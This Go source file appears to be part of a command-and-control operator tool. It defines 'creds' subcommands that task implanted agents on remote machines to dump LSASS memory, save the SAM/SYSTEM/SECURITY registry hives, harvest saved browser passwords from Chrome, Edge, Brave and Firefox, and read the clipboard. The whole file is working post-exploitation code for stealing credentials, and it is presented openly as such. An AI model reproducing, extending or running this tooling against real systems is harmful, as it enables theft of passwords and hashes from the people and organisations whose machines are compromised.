package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

var credsCmd = &cobra.Command{
	Use:   "creds",
	Short: "Credential access — LSASS, SAM, browsers, clipboard",
}

func credsPost(agentID, endpoint string, payload interface{}, desc string, wait bool, timeout int) {
	raw, _ := json.Marshal(payload)
	body, err := makeAPIRequestWithMethod("POST",
		"/api/v1/agent/"+agentID+"/"+endpoint,
		bytes.NewBuffer(raw), "application/json")
	if err != nil {
		printError(fmt.Sprintf("%s failed: %v", desc, err))
		os.Exit(1)
	}
	var resp APIResponse
	if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
		msg := resp.Error
		if msg == "" {
			msg = "unknown error"
		}
		printError(fmt.Sprintf("%s failed: %s", desc, msg))
		os.Exit(1)
	}
	dataMap, _ := resp.Data.(map[string]interface{})
	cmdID, _ := dataMap["command_id"].(string)
	printSuccess(fmt.Sprintf("%s queued (cmd %s)", desc, cmdID))
	if wait && cmdID != "" {
		printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
		if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
			displayFinalCommandStatus(finalData, cmdID)
		}
	} else if cmdID != "" {
		printInfo(fmt.Sprintf("command_id: %s", cmdID))
	}
}

// ─── creds lsass ─────────────────────────────────────────────────────────────

var credsLSASSCmd = &cobra.Command{
	Use:   "lsass <agent-id>",
	Short: "Dump LSASS memory via MiniDumpWriteDump",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		output, _ := cmd.Flags().GetString("output")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		credsPost(agentID, "creds/lsass", map[string]interface{}{"output": output}, "LSASS dump", wait, timeout)
	},
}

// ─── creds sam ───────────────────────────────────────────────────────────────

var credsSAMCmd = &cobra.Command{
	Use:   "sam <agent-id>",
	Short: "Save SAM/SYSTEM/SECURITY hives via reg save",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		outDir, _ := cmd.Flags().GetString("dir")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		credsPost(agentID, "creds/sam", map[string]interface{}{"output_dir": outDir}, "SAM dump", wait, timeout)
	},
}

// ─── creds browser ───────────────────────────────────────────────────────────

var credsBrowserCmd = &cobra.Command{
	Use:   "browser <agent-id>",
	Short: "Harvest saved passwords from Chrome, Edge, Brave, Firefox",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		credsPost(agentID, "creds/browser", map[string]interface{}{}, "Browser creds harvest", wait, timeout)
	},
}

// ─── creds clipboard ─────────────────────────────────────────────────────────

var credsClipboardCmd = &cobra.Command{
	Use:   "clipboard <agent-id>",
	Short: "Read current clipboard contents",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		credsPost(agentID, "creds/clipboard", map[string]interface{}{}, "Clipboard read", wait, timeout)
	},
}
